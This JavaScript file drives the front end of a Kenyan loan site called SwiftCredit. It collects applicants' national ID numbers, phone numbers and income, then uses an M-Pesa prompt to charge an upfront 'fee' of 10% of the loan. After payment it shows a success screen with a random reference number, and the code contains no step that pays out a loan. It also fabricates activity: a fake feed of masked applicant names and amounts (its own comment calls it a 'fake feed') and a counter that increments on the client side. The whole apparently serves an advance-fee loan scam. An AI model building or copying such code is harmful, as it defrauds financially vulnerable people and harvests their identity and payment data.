/* SwiftCredit — main.js FINAL
   Functions called from HTML:
   selectPlan, applyCustom, proceedCustom,
   closeModal, closeModalOutside,
   submitApp, cancelWait
*/

const API = '';

/* ── state ──────────────────────────── */
const S = {
  amount: 0, tenor: 1, monthly: 0, fee: 0,
  appId: null, txnId: null,
  pollIv: null, cdIv: null,
};

/* ── utils ──────────────────────────── */
const el   = id => document.getElementById(id);
const set  = (id, v) => { const e = el(id); if (e) e.textContent = v; };
const fmt  = n => Number(n).toLocaleString('en-KE');
const wait = ms => new Promise(r => setTimeout(r, ms));

/* ── toast ──────────────────────────── */
let _tt;
function toast(msg, type) {
  const t = el('toast');
  el('t-icon').textContent = type === 'ok' ? '✅' : type === 'err' ? '❌' : 'ℹ️';
  el('t-msg').textContent  = msg;
  t.className = 'toast-wrap on' + (type === 'ok' ? ' ok' : type === 'err' ? ' err' : '');
  clearTimeout(_tt);
  _tt = setTimeout(() => t.classList.remove('on'), 4500);
}

/* ── calc helpers ───────────────────── */
function calcMonthly(amt, months) {
  const r = 0.12 / 12;
  if (months === 1) return Math.round(amt * (1 + r));
  return Math.round(amt * (r * Math.pow(1+r,months)) / (Math.pow(1+r,months)-1));
}
function calcFee(amt) { return Math.round(amt * 0.10); }

/* ══════════════════════════════════════
   PLAN CARDS
══════════════════════════════════════ */
function selectPlan(card, amount, fee, tenor) {
  /* highlight selected card */
  document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
  card.classList.add('selected');

  /* store state */
  S.amount  = amount;
  S.tenor   = tenor;
  S.fee     = fee;
  S.monthly = calcMonthly(amount, tenor);

  /* open modal with plan details */
  openModal();
}

/* ══════════════════════════════════════
   CUSTOM AMOUNT
══════════════════════════════════════ */
function applyCustom() {
  const raw   = parseInt(el('customAmount').value);
  const tenor = parseInt(el('customTenor').value);

  if (!raw || raw < 1000) { toast('Minimum loan amount is KES 1,000', 'err'); return; }
  if (raw > 150000)        { toast('Maximum loan amount is KES 150,000', 'err'); return; }

  const monthly = calcMonthly(raw, tenor);
  const fee     = calcFee(raw);
  const total   = Math.round(monthly * tenor);

  set('cawr-monthly', `KES ${fmt(monthly)}`);
  set('cawr-fee',     `KES ${fmt(fee)}`);
  set('cawr-total',   `KES ${fmt(total)}`);

  el('caw-result').style.display = 'block';

  /* store for proceed */
  S.amount  = raw;
  S.tenor   = tenor;
  S.fee     = fee;
  S.monthly = monthly;
}

function proceedCustom() {
  if (!S.amount) { toast('Please calculate your loan first', 'err'); return; }
  document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
  openModal();
}

/* ══════════════════════════════════════
   MODAL
══════════════════════════════════════ */
function openModal() {
  /* populate summary */
  set('ms-amount',  `KES ${fmt(S.amount)}`);
  set('ms-tenor',   `${S.tenor} month${S.tenor > 1 ? 's' : ''}`);
  set('ms-monthly', `KES ${fmt(S.monthly)}`);
  set('ms-fee',     `KES ${fmt(S.fee)}`);

  /* reset to form step */
  el('modal-step-form').style.display    = 'block';
  el('modal-step-waiting').style.display = 'none';
  el('modal-step-success').style.display = 'none';

  /* re-enable submit btn */
  const b = el('btn-stk');
  if (b) { b.disabled = false; b.innerHTML = '🔒 Send STK Push'; }

  el('modal').classList.add('open');
  document.body.style.overflow = 'hidden';
}

function closeModal() {
  el('modal').classList.remove('open');
  document.body.style.overflow = '';
  clearInterval(S.pollIv);
  clearInterval(S.cdIv);
}

function closeModalOutside(e) {
  if (e.target === el('modal')) closeModal();
}

/* ── field validation helpers ─────── */
function mErr(id, show, msg) {
  const e = el('merr-' + id), i = el('m-' + id);
  if (e) { if (msg) e.textContent = msg; e.classList.toggle('on', show); }
  if (i) i.classList.toggle('err', show);
}
function clearMErrs() {
  document.querySelectorAll('.mferr').forEach(e  => e.classList.remove('on'));
  document.querySelectorAll('.mfinput.err').forEach(i => i.classList.remove('err'));
}

/* ══════════════════════════════════════
   SUBMIT APPLICATION
══════════════════════════════════════ */
async function submitApp() {
  clearMErrs();

  const fname = el('m-firstName').value.trim();
  const lname = el('m-lastName').value.trim();
  const idnum = el('m-idNumber').value.trim();
  const rawph = el('m-phone').value.trim();
  const emp   = el('m-employment').value;
  const inc   = el('m-income').value;
  const purp  = el('m-purpose').value;
  const ok    = el('m-consent').checked;

  let valid = true;
  if (!fname) { mErr('firstName', true); valid = false; }
  if (!lname) { mErr('lastName',  true); valid = false; }

  /* Kenya National ID: 7–9 digits */
  if (!/^\d{7,9}$/.test(idnum)) { mErr('idNumber', true, 'Enter a valid 7–9 digit ID number'); valid = false; }

  /* Safaricom: starts 7 or 1, 9 digits after stripping leading 0 */
  const ph = rawph.replace(/^0/, '').replace(/\s/g, '');
  if (!/^[17]\d{8}$/.test(ph)) { mErr('phone', true, 'Enter a valid Safaricom number'); valid = false; }

  if (!emp)              { mErr('employment', true); valid = false; }
  if (!inc || Number(inc) < 1) { mErr('income', true); valid = false; }
  if (!purp)             { mErr('purpose', true); valid = false; }

  if (!ok)    { toast('Please accept the terms and conditions', 'err'); return; }
  if (!valid) { toast('Please fill in all required fields', 'err'); return; }

  const btn = el('btn-stk');
  btn.disabled = true; btn.textContent = 'Please wait…';

  try {
    /* Step 1 — create application */
    const r1   = await fetch(`${API}/api/application/start`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        firstName: fname, lastName: lname, idNumber: idnum,
        phone: '0' + ph, dob: '2000-01-01', gender: 'Prefer not to say',
        employment: emp, income: Number(inc), loanPurpose: purp, kraPin: '', email: '',
      }),
    });
    const d1 = await r1.json();
    if (!r1.ok) { toast(d1.error || 'Error starting application', 'err'); btn.disabled = false; btn.innerHTML = '🔒 Send STK Push'; return; }
    S.appId = d1.applicationId;

    /* Step 2 — eligibility */
    await fetch(`${API}/api/application/eligibility/${S.appId}`, { method: 'POST' });

    /* Step 3 — select loan terms */
    const r3 = await fetch(`${API}/api/application/select/${S.appId}`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ loanAmount: S.amount, tenor: S.tenor }),
    });
    const d3 = await r3.json();
    if (!r3.ok) { toast(d3.error || 'Error saving loan terms', 'err'); btn.disabled = false; btn.innerHTML = '🔒 Send STK Push'; return; }

    /* Step 4 — initiate STK push */
    const r4 = await fetch(`${API}/api/mpesa/pay`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.appId, phone: '0' + ph }),
    });
    const d4 = await r4.json();
    if (!r4.ok || !d4.transactionId) {
      toast(d4.error || 'Could not send M-Pesa prompt. Try again.', 'err');
      btn.disabled = false; btn.innerHTML = '🔒 Send STK Push'; return;
    }

    S.txnId = d4.transactionId;

    /* show phone waiting screen */
    el('modal-step-form').style.display    = 'none';
    el('modal-step-waiting').style.display = 'block';

    const display = '+254' + ph;
    set('wait-phone-display', display);

    startCd(120);
    startPoll(ph);

  } catch (err) {
    toast('Network error. Check your connection and retry.', 'err');
    btn.disabled = false; btn.innerHTML = '🔒 Send STK Push';
  }
}

/* ── Countdown ───────────────────── */
function startCd(secs) {
  clearInterval(S.cdIv);
  let s = secs; set('wait-cd', s);
  S.cdIv = setInterval(() => {
    s--; set('wait-cd', s);
    if (s <= 0) {
      clearInterval(S.cdIv); clearInterval(S.pollIv);
      toast('Session expired. Please try again.', 'err');
      closeModal();
    }
  }, 1000);
}

/* ── Poll payment status ─────────── */
function startPoll(ph) {
  clearInterval(S.pollIv);
  S.pollIv = setInterval(async () => {
    try {
      const res  = await fetch(`${API}/api/mpesa/status/${S.txnId}`);
      const data = await res.json();
      if (data.status === 'success') {
        clearInterval(S.pollIv); clearInterval(S.cdIv);
        onPayConfirmed(data.mpesaCode, ph);
      } else if (data.status === 'failed') {
        clearInterval(S.pollIv); clearInterval(S.cdIv);
        toast('Payment failed or cancelled. Please try again.', 'err');
        closeModal();
      }
    } catch { /* keep polling on network blip */ }
  }, 2500);
}

/* ── Payment confirmed ───────────── */
async function onPayConfirmed(code, ph) {
  try {
    await fetch(`${API}/api/application/submit/${S.appId}`, { method: 'POST' });
  } catch { /* proceed to success anyway */ }

  /* success screen */
  el('modal-step-waiting').style.display = 'none';
  el('modal-step-success').style.display = 'block';

  set('succ-amount', `KES ${fmt(S.amount)}`);
  set('succ-paid',   `KES ${fmt(S.fee)}`);
  set('succ-code',   code || '—');

  /* generate reference */
  const ref = 'SC-' + new Date().getFullYear() + '-' + String(Math.floor(Math.random()*900000)+100000);
  set('succ-ref', ref);

  /* update live feed */
  addFeedItem(`KES ${fmt(S.amount)}`);

  /* bump counter */
  const ctr = el('total-apps');
  if (ctr) ctr.textContent = (parseInt(ctr.textContent.replace(/,/g,'')) + 1).toLocaleString('en-KE');
}

/* ── Cancel waiting ──────────────── */
function cancelWait() {
  clearInterval(S.pollIv); clearInterval(S.cdIv);
  closeModal();
}

/* ══════════════════════════════════════
   LIVE FEED
══════════════════════════════════════ */
const NAMES = [
  'J*** M***','A*** K***','F*** W***','P*** O***','G*** N***',
  'S*** A***','M*** C***','R*** L***','B*** J***','C*** D***',
];
const AMOUNTS = [1000,5000,10000,20000,30000,50000,75000,100000,150000];
function randomItem(arr) { return arr[Math.floor(Math.random()*arr.length)]; }

function addFeedItem(amtStr) {
  const list = el('feed-list'); if (!list) return;
  const item = document.createElement('div');
  item.className = 'feed-item';
  item.innerHTML = `<span class="fi-name">${randomItem(NAMES)}</span><span class="fi-amount">${amtStr}</span><span class="fi-time">Just now</span><span class="fi-status ok">✓ Applied</span>`;
  list.insertBefore(item, list.firstChild);
  /* keep max 8 items */
  while (list.children.length > 8) list.removeChild(list.lastChild);
}

/* periodic fake feed to show activity */
const feedAmts = AMOUNTS.map(a => `KES ${a.toLocaleString('en-KE')}`);
setInterval(() => {
  const list = el('feed-list'); if (!list) return;
  /* update existing "X min ago" times */
  list.querySelectorAll('.fi-time').forEach(t => {
    const m = t.textContent.match(/(\d+) min/);
    if (m) t.textContent = (parseInt(m[1]) + 1) + ' min ago';
  });
  /* occasionally add a new item */
  if (Math.random() < 0.3) addFeedItem(randomItem(feedAmts));
}, 30000);

/* ESC key closes modal */
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
